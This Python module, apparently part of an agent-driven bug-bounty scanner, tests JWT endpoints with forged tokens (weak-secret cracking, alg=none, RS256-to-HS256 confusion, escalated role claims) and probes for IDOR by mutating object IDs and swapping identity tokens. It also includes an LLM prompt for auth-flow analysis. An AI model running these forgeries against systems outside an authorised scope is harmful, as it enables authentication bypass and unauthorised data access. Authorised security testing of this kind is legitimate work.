"""Auth-boundary testing: JWT forgery/crack checks, BOLA/IDOR differential-auth
checks, and login/session-flow reasoning — closes
docs/DEVELOPMENT_PLAN.md's Phase 3 Tier 2 `auth_mapper.py` item.

Every request-sending technique here was reimplemented from scratch after
reviewing how a third-party OWASP-API scanner approached the same problem
(no code was copied — see MEMORY.md for the evaluation) — see
skills/jwt_toolkit.py for the forging primitives and
tools/response_fingerprint.py for the false-positive guards shared with
future skills.

check_jwt_weaknesses and check_idor are HIGH risk in agent/risk.py: forging
and replaying real auth material, or presenting a second identity's token
against an object, is an active bypass attempt — not passive inspection —
the same reasoning that keeps run_sqlmap/run_ghauri HIGH despite being
hardcoded detect-only. Always call check_scope on the target host first.
map_auth_flow sends no requests at all (pure LLM reasoning over a
human-supplied sequence, same shape as skills/business_logic_mapper.py) and
is LOW risk on that basis.
"""
import json
import re

from langchain_core.messages import HumanMessage
from langchain_core.tools import tool
from langchain_ollama import ChatOllama
from pydantic import BaseModel

from config.settings import settings
from skills.jwt_toolkit import (
    jwks_to_pem,
    jwt_crack_weak_secret,
    jwt_forge_alg_confusion,
    jwt_forge_alg_none,
    jwt_parts,
    jwt_sign_hs256,
)
from tools.base import Finding, ToolResult
from tools.http_client import HttpResponse, send_request
from tools.response_fingerprint import is_distinct_object, responses_equivalent

_JWKS_PATHS = ("/.well-known/jwks.json", "/jwks.json", "/oauth/jwks", "/auth/jwks.json")
_NUMERIC_ID_RE = re.compile(r"/(\d+)(?=/|$|\?)")
_ID_CANDIDATES_NUMERIC = ["0", "1", "2", "99", "100"]

_ERROR_HINT_RE = re.compile(
    r'"(?:error|message|detail)"\s*:\s*"[^"]*\b(?:not found|forbidden|unauthorized|'
    r'unauthenticated|denied|invalid|expired)\b', re.IGNORECASE,
)
_EMPTY_BODY_RE = re.compile(r"^\s*(\{\}|\[\]|null)\s*$")


def _looks_accepted(resp: HttpResponse) -> bool:
    """2xx alone isn't enough — a rejected request can still come back 200 with
    an error-shaped or empty body (confirmed live: a fixed body-length threshold
    missed a real accepted response that happened to land at exactly 50 bytes,
    and a real rejection body can easily exceed a small threshold anyway).
    Content-based check instead: reject empty/`{}`/`[]`/`null` bodies and
    anything with an explicit error/denial phrase, accept everything else.
    """
    if not (200 <= resp.status < 300):
        return False
    body = resp.body.strip()
    if not body or _EMPTY_BODY_RE.match(body):
        return False
    return not _ERROR_HINT_RE.search(body)


def _bearer(token: str) -> dict[str, str]:
    return {"Authorization": f"Bearer {token}"}


@tool
async def check_jwt_weaknesses(token: str, target_url: str, method: str = "GET") -> dict:
    """Test a JWT for weak-secret, alg=none, and RS256->HS256 forgery bypasses.

    HIGH risk — every sub-test replays a genuinely forged token against the
    real target; this is an active auth-bypass attempt, not passive
    inspection. Call check_scope on target_url's host first.

    Sequence, each step gated to avoid a specific known false-positive:
    1. Garbage-signature control: re-signs the token's own header/payload
       with a definitely-wrong secret and sends it. If THAT is accepted,
       the endpoint isn't verifying signatures at all — reports that alone
       and skips every sub-test below, since "weak secret" or "alg=none"
       findings on top would just restate the same root cause.
    2. Weak-secret dictionary crack (offline, ~20 candidates, constant-time
       compare) — a hit alone is conclusive, no replay needed to confirm it.
    3. alg=none forgery with tampered claims (role/is_admin), replayed.
    4. If the token's own header says RS256: probes a handful of common
       JWKS paths on target_url's host; for each RSA key found, forges an
       HS256 token signed with that key's own PEM bytes (the classic
       algorithm-confusion bug) and replays it.
    """
    try:
        header, payload, _ = jwt_parts(token)
    except (ValueError, KeyError, IndexError) as exc:
        return ToolResult(
            tool="check_jwt_weaknesses", command_run=f"check_jwt_weaknesses({target_url})",
            raw_output="", parsed=[], duration_s=0.0,
            error=f"could not parse token as a JWT: {exc}",
        ).model_dump()

    findings: list[Finding] = []
    garbage_token = jwt_sign_hs256(header, payload, secret=b"__auth_mapper_control_signature__")
    control_resp = await send_request(method, target_url, headers=_bearer(garbage_token))

    if _looks_accepted(control_resp):
        findings.append(Finding(
            type="jwt_signature_not_verified", target=target_url,
            detail=(
                "A token re-signed with a random control secret was still accepted "
                f"(status={control_resp.status}) — signature is not verified at all. "
                "Skipping weak-secret/alg-none/alg-confusion sub-tests: they'd only "
                "confirm the same root cause."
            ),
            severity="critical", tool_source="auth_mapper",
        ))
        return ToolResult(
            tool="check_jwt_weaknesses", command_run=f"check_jwt_weaknesses({target_url})",
            raw_output=control_resp.body[:2000], parsed=findings,
            duration_s=control_resp.elapsed_ms / 1000, error=None,
        ).model_dump()

    cracked_secret = jwt_crack_weak_secret(token)
    if cracked_secret is not None:
        findings.append(Finding(
            type="jwt_weak_secret", target=target_url,
            detail=f"HMAC secret cracked via offline dictionary attack: {cracked_secret!r}",
            severity="critical", tool_source="auth_mapper",
        ))

    forged_none = jwt_forge_alg_none({**payload, "role": "admin", "is_admin": True}, header)
    none_resp = await send_request(method, target_url, headers=_bearer(forged_none))
    if _looks_accepted(none_resp) and not responses_equivalent(control_resp.body, none_resp.body):
        findings.append(Finding(
            type="jwt_alg_none_accepted", target=target_url,
            detail=f"alg=none forged token (tampered role/is_admin claims) accepted, status={none_resp.status}",
            severity="critical", tool_source="auth_mapper",
        ))

    if header.get("alg", "").upper().startswith("RS"):
        host_match = re.match(r"(https?://[^/]+)", target_url)
        base = host_match.group(1) if host_match else target_url
        for jwks_path in _JWKS_PATHS:
            jwks_resp = await send_request("GET", base + jwks_path)
            if jwks_resp.status != 200 or not jwks_resp.body:
                continue
            try:
                keys = json.loads(jwks_resp.body).get("keys", [])
            except ValueError:
                continue
            for jwk in keys:
                if jwk.get("kty") != "RSA" or "n" not in jwk or "e" not in jwk:
                    continue
                try:
                    pem = jwks_to_pem(jwk)
                except (KeyError, ValueError):
                    continue
                forged_confused = jwt_forge_alg_confusion(token, pem, {"role": "admin", "is_admin": True})
                confused_resp = await send_request(method, target_url, headers=_bearer(forged_confused))
                if _looks_accepted(confused_resp) and not responses_equivalent(control_resp.body, confused_resp.body):
                    findings.append(Finding(
                        type="jwt_alg_confusion", target=target_url,
                        detail=(
                            "RS256->HS256 algorithm-confusion forgery (signed with the server's "
                            f"own public key from {base + jwks_path}) accepted, status={confused_resp.status}"
                        ),
                        severity="critical", tool_source="auth_mapper",
                    ))
            break  # found a JWKS endpoint; no need to keep guessing paths

    return ToolResult(
        tool="check_jwt_weaknesses", command_run=f"check_jwt_weaknesses({target_url})",
        raw_output=control_resp.body[:2000], parsed=findings,
        duration_s=control_resp.elapsed_ms / 1000, error=None,
    ).model_dump()


@tool
async def check_idor(url: str, token: str, other_identity_token: str = "") -> dict:
    """Check a single object-returning endpoint for BOLA/IDOR.

    HIGH risk — actively probes for access to objects the calling identity
    may not be authorized to see, and (with other_identity_token) presents a
    second identity's credentials against the same URL. Call check_scope on
    url's host first.

    Two independent techniques, each with its own false-positive guard:
    1. Numeric-ID mutation (only if `url` has a numeric path segment): tries
       a small bounded set of alternate IDs (0/1/2/99/100) with the SAME
       token, and only flags a hit if the response is a genuinely distinct
       object (tools.response_fingerprint.is_distinct_object) — not a copy
       of the original or an error/catch-all page. Stops at the first
       confirmed hit; one is enough signal.
    2. Differential-auth (only if other_identity_token is given): fetches
       the exact same URL with both tokens and flags CRITICAL only if the
       two responses are equivalent — i.e. two different identities were
       served the identical object. This deliberately does NOT flag the
       common, correct case of two users each seeing their own distinct
       "/me"-style resource.
    """
    baseline = await send_request("GET", url, headers=_bearer(token))
    findings: list[Finding] = []

    id_match = _NUMERIC_ID_RE.search(url)
    if id_match and baseline.status == 200:
        original_id = id_match.group(1)
        for candidate in _ID_CANDIDATES_NUMERIC:
            if candidate == original_id:
                continue
            mutated_url = url[:id_match.start(1)] + candidate + url[id_match.end(1):]
            resp = await send_request("GET", mutated_url, headers=_bearer(token))
            if resp.status == 200 and is_distinct_object(baseline.body, resp.body):
                findings.append(Finding(
                    type="bola_id_mutation", target=mutated_url,
                    detail=(
                        f"Same token, ID {original_id!r} -> {candidate!r}: got a distinct 200 "
                        "object, not an error/catch-all page."
                    ),
                    severity="high", tool_source="auth_mapper",
                ))
                break  # one confirmed hit per endpoint is enough signal

    if other_identity_token:
        other_resp = await send_request("GET", url, headers=_bearer(other_identity_token))
        if (baseline.status == 200 and other_resp.status == 200
                and responses_equivalent(baseline.body, other_resp.body)):
            findings.append(Finding(
                type="bola_differential_auth", target=url,
                detail=(
                    f"Two different identities' tokens both retrieved the SAME object from {url} "
                    f"(status {baseline.status}/{other_resp.status}, equivalent bodies)."
                ),
                severity="critical", tool_source="auth_mapper",
            ))

    return ToolResult(
        tool="check_idor", command_run=f"check_idor({url})",
        raw_output=baseline.body[:2000], parsed=findings,
        duration_s=baseline.elapsed_ms / 1000, error=baseline.error,
    ).model_dump()


# --- map_auth_flow: the login/session/role-gated/password-reset piece of the
# original Phase 3 checklist item that check_jwt_weaknesses/check_idor don't
# cover — reasoning over a *sequence*, the same class of problem
# skills/business_logic_mapper.py already solves for checkout/invite/refund
# flows, not something a single request/response check can catch. ---

_llm = ChatOllama(
    base_url=settings.OLLAMA_BASE_URL,
    model=settings.OLLAMA_MODEL,
    temperature=settings.LLM_TEMPERATURE,
    num_ctx=settings.OLLAMA_NUM_CTX,
)

_AUTH_FLOW_PROMPT_TEMPLATE = """You are an authentication-flow analyst for a bug bounty hunt.
Given this sequence of observed HTTP requests covering a login and whatever came after it \
(session/refresh token issuance, subsequent authenticated calls, password-reset, account \
settings, admin/role-gated endpoints), map the flow and flag concrete follow-up tests.

Look specifically for:
- Whether session/refresh tokens are scoped correctly (short-lived access token + separate \
refresh token) or a single long-lived token is reused everywhere
- Endpoints that appear to require a specific role/privilege level but aren't clearly \
re-checked after initial login (candidates for check_idor/check_jwt_weaknesses follow-up)
- Password-reset flow weaknesses: reset token predictability/reuse, missing rate limiting, \
whether the reset token invalidates old sessions, host-header/link-injection risk in the reset email link
- Whether logout actually invalidates the session/token server-side or just clears it client-side
- Privilege escalation opportunities: role/permission fields present in login or token refresh \
responses that a client could tamper with

FLOW NAME: {flow_name}
REQUEST SEQUENCE:
{steps_json}

Return ONLY a JSON array, no prose, in this shape:
[{{"suspected_flaw": "", "steps_involved": [], "how_to_test": [], "potential_severity": ""}}]
If nothing plausible, return [].
"""


class AuthFlowFinding(BaseModel):
    suspected_flaw: str
    steps_involved: list[str]
    how_to_test: list[str]
    potential_severity: str


@tool
def map_auth_flow(flow_name: str, steps_json: str) -> str:
    """Reason over a login/session/password-reset request sequence for auth-flow flaws.

    LOW risk — pure LLM reasoning over a human-supplied sequence, sends no
    requests itself (same shape as skills/business_logic_mapper.py's
    map_business_logic). Call this once a crawl/manual-testing pass has
    captured the login flow plus whatever followed it (token refresh,
    role-gated endpoints, password reset). Output: a JSON array of
    AuthFlowFinding objects (may be empty) — each `how_to_test` entry is
    meant to become a concrete check_idor/check_jwt_weaknesses call, not a
    vague suggestion. These findings are never auto-confirmable, same as
    business-logic findings — always route to a human for review.
    """
    prompt = _AUTH_FLOW_PROMPT_TEMPLATE.format(flow_name=flow_name, steps_json=steps_json)
    response = _llm.invoke([HumanMessage(content=prompt)])
    content = response.content.strip()

    try:
        start, end = content.index("["), content.rindex("]") + 1
        parsed = json.loads(content[start:end])
        [AuthFlowFinding(**item) for item in parsed]  # validate shape
        return json.dumps(parsed)
    except (ValueError, TypeError, json.JSONDecodeError):
        return "[]"
